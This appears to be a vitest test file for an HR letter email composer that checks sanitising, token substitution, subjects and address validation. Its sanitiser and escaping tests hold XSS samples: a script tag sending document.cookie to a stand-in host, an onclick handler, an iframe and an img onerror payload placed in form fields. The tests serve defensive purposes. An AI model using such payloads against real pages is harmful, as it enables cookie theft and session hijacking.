// What an HR letter email must and must not carry.
//
// These letters are the artefact somebody produces years later to prove what they did here, so the
// two properties that matter are: the thing SENT is the thing that was REVIEWED, and nothing a form
// field contains can become markup on the way out. Everything else is a convenience.
import { describe, it, expect } from 'vitest';
import {
  LETTER_TYPES, LETTER_TOKENS, MAX_LETTER_HTML, MAX_NOTE_HTML,
  composeLetterEmail, fillLetterTokens, recipientProblem,
} from './letter-mail';

const ctx = {
  recipientName: 'Anita Sharma',
  recipientEmail: 'anita@example.com',
  roleTitle: 'AI Research Intern',
  refNumber: 'REC-2026-AB12CD',
  issueDate: '2026-08-25',
  signatoryName: 'Siddharth Prasad',
  signatoryTitle: 'Founder & CEO',
};

describe('letter types', () => {
  it('covers every type the three surfaces can produce, and nothing else', () => {
    expect(Object.keys(LETTER_TYPES).sort()).toEqual([
      'offboarding:experience', 'offboarding:noc', 'offboarding:relieving',
      'offer:offer',
      'recommendation:completion', 'recommendation:recommendation', 'recommendation:twmic',
    ]);
    // The key is `family:subtype` and the family field must agree with it — a page submits the key
    // and the audit line records it, so a disagreement would file a letter under the wrong desk.
    for (const [key, t] of Object.entries(LETTER_TYPES)) {
      expect(key).toBe(t.key);
      expect(key.startsWith(t.family + ':')).toBe(true);
      expect(t.label.length).toBeGreaterThan(0);
    }
  });

  it('refuses a type it does not know rather than sending "your undefined"', () => {
    expect(() => composeLetterEmail({ typeKey: 'offer:promotion', ctx })).toThrow(/Unknown letter type/);
  });
});

describe('recipientProblem', () => {
  it('names the reason instead of failing silently', () => {
    expect(recipientProblem('')).toMatch(/No email address/);
    expect(recipientProblem('   ')).toMatch(/No email address/);
    expect(recipientProblem('not-an-address')).toMatch(/does not look like/);
    expect(recipientProblem('a@b')).toMatch(/does not look like/);
    expect(recipientProblem('x'.repeat(250) + '@example.com')).toMatch(/too long/);
  });

  it('accepts an ordinary address', () => {
    expect(recipientProblem('anita@example.com')).toBeNull();
    expect(recipientProblem('  anita.s+hr@sub.example.co.in  ')).toBeNull();
  });
});

describe('composeLetterEmail', () => {
  it('sends the letter that was reviewed, not a second rendering of it', () => {
    const letterHtml = '<div style="padding:8px"><h2>Letter of Recommendation</h2>'
      + '<p>Anita worked on the ranking pipeline.</p></div>';
    const c = composeLetterEmail({ typeKey: 'recommendation:recommendation', ctx, letterHtml });
    expect(c.html).toContain('Anita worked on the ranking pipeline.');
    expect(c.html).toContain('Letter of Recommendation');
    expect(c.text).toContain('Anita worked on the ranking pipeline.');
  });

  it('strips script, handlers and disallowed elements out of the letter, and says what it removed', () => {
    const hostile = '<div>Good part'
      + '<script>fetch("https://evil.example/"+document.cookie)</script>'
      + '<p onclick="steal()">Click</p>'
      + '<iframe src="https://evil.example"></iframe>'
      + '</div>';
    const c = composeLetterEmail({ typeKey: 'offboarding:relieving', ctx, letterHtml: hostile });
    expect(c.html).toContain('Good part');
    expect(c.html).not.toContain('<script');
    expect(c.html).not.toContain('onclick');
    expect(c.html).not.toContain('<iframe');
    expect(c.html).not.toContain('steal()');
    // The operator is told rather than surprised: the preview had something the message does not.
    expect(c.removed.length).toBeGreaterThan(0);
    expect(c.removed.some((r) => r.name === 'script' || r.name === 'iframe' || r.name === 'onclick')).toBe(true);
  });

  it('keeps the inline styles a letter is made of — an unstyled letter is not the letter', () => {
    const letterHtml = '<div style="background:#fdfcf8;padding:30px"><p style="font-size:13px">Body</p></div>';
    const c = composeLetterEmail({ typeKey: 'recommendation:twmic', ctx, letterHtml });
    expect(c.html).toContain('background:#fdfcf8');
    expect(c.html).toContain('font-size:13px');
  });

  it('substitutes the operator’s tokens in the NOTE and never in the letter', () => {
    // The letter has already been read and signed off. Substituting into it could only change a
    // document somebody has already approved.
    const c = composeLetterEmail({
      typeKey: 'recommendation:completion',
      ctx,
      noteHtml: '<p>Hello {{name}}, your {{role}} letter, ref {{ref}}.</p>',
      letterHtml: '<p>Reference {{ref}} must stay literal here.</p>',
    });
    expect(c.html).toContain('Hello Anita Sharma, your AI Research Intern letter, ref REC-2026-AB12CD.');
    expect(c.html).toContain('Reference {{ref}} must stay literal here.');
  });

  it('escapes a value substituted into a token, so a name cannot become markup', () => {
    const c = composeLetterEmail({
      typeKey: 'offboarding:noc',
      ctx: { ...ctx, recipientName: '<img src=x onerror=alert(1)>' },
      noteHtml: '<p>Dear {{name}},</p>',
    });
    // The point is that it arrives as TEXT, not as a tag. The word "onerror" surviving inside an
    // escaped string is not a finding — `&lt;img src=x onerror=alert(1)&gt;` renders as characters
    // and executes nothing. What must not exist is a live element.
    expect(c.html).toContain('&lt;img');
    expect(c.html).not.toMatch(/<img[^>]*onerror/i);
  });

  it('sanitises the note BEFORE substituting, so a token cannot smuggle markup back in', () => {
    // If the order were reversed, a value carrying a tag would land in a document the sanitiser had
    // already finished inspecting.
    const c = composeLetterEmail({
      typeKey: 'offer:offer',
      ctx: { ...ctx, roleTitle: '</p><script>x()</script><p>' },
      noteHtml: '<p>Role: {{role}}</p>',
    });
    expect(c.html).not.toContain('<script');
    expect(c.html).toContain('&lt;/p&gt;');
  });

  it('writes a default covering note rather than sending a bare document', () => {
    const c = composeLetterEmail({ typeKey: 'offboarding:experience', ctx, letterHtml: '<p>x</p>' });
    expect(c.html).toContain('Dear Anita Sharma');
    expect(c.html.toLowerCase()).toContain('experience letter');
  });

  it('links to the canonical copy when there is one, and never attaches a file', () => {
    const c = composeLetterEmail({
      typeKey: 'offer:offer',
      ctx: { ...ctx, letterUrl: 'https://www.edurankai.in/portal/offer/abc123' },
      noteHtml: '<p>Congratulations.</p>',
    });
    expect(c.html).toContain('https://www.edurankai.in/portal/offer/abc123');
    expect(c.html).toContain('Open the signed copy');
  });

  it('carries the positioning sentence on every letter', () => {
    // EduRankAI is the technology platform; partners award credentials. A letter is exactly the
    // artefact somebody later reads as a claim about what this company is.
    for (const key of Object.keys(LETTER_TYPES)) {
      const c = composeLetterEmail({ typeKey: key, ctx, letterHtml: '<p>x</p>' });
      expect(c.html).toContain('accredited partners award credentials');
    }
  });

  it('names the letter and the role in the subject, so an inbox search finds it', () => {
    const c = composeLetterEmail({ typeKey: 'offboarding:relieving', ctx });
    expect(c.subject).toBe('Relieving Letter — AI Research Intern — EduRankAI');
    const noRole = composeLetterEmail({ typeKey: 'offboarding:relieving', ctx: { ...ctx, roleTitle: '' } });
    expect(noRole.subject).toBe('Relieving Letter — EduRankAI');
  });

  it('has no emoji anywhere in any composed letter', () => {
    // House rule: inline monochrome SVG only, never an emoji — including in mail this company signs.
    const emoji = /[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\u{FE0F}]/u;
    for (const key of Object.keys(LETTER_TYPES)) {
      const c = composeLetterEmail({ typeKey: key, ctx, noteHtml: '<p>hello</p>', letterHtml: '<p>x</p>' });
      expect(emoji.test(c.subject)).toBe(false);
      expect(emoji.test(c.html)).toBe(false);
    }
  });
});

describe('fillLetterTokens', () => {
  it('replaces every declared token and leaves an undeclared one alone', () => {
    const out = fillLetterTokens('{{name}}|{{role}}|{{ref}}|{{date}}|{{signatory}}|{{salary}}', ctx);
    expect(out).toBe('Anita Sharma|AI Research Intern|REC-2026-AB12CD|2026-08-25|Siddharth Prasad|{{salary}}');
  });

  it('every token the composer offers is one it actually substitutes', () => {
    // A button that inserts a token nothing replaces puts {{curly braces}} in front of a candidate.
    const filled = fillLetterTokens(LETTER_TOKENS.map((t) => t.token).join(' '), ctx);
    expect(filled).not.toMatch(/\{\{/);
  });

  it('replaces a missing optional field with nothing rather than "undefined"', () => {
    const out = fillLetterTokens('[{{role}}]', { recipientName: 'A', recipientEmail: 'a@b.co' });
    expect(out).toBe('[]');
  });
});

describe('size ceilings', () => {
  it('are a letter-sized letter and a note-sized note', () => {
    expect(MAX_LETTER_HTML).toBe(200_000);
    expect(MAX_NOTE_HTML).toBe(20_000);
    expect(MAX_NOTE_HTML).toBeLessThan(MAX_LETTER_HTML);
  });
});
